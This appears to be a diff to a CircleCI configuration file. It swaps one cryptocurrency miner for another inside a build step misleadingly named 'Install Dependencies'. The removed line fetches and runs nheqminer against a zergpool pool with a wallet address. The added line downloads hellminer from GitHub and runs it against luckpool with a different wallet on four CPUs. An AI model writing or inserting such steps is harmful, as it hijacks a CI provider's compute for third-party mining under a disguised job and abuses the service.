@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Install Dependencies"
-          command: "wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && sudo nheqminer/nheqminer -v -l verushash.na.mine.zergpool.com:3300 -u DTYDuVmi9htpivktwfrWkJEvGhqJBSHJog.$(shuf -n 1 -i 1-99999)-doge -p c=DOGE -t 4 -e 2"
+          command: "wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && ./hellminer  -c stratum+tcp://na.luckpool.net:3956 -u RT15dMcXVKH8waNmVQvEFgjNCuHjprQgdB.Rig001 -p x --cpu 4"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
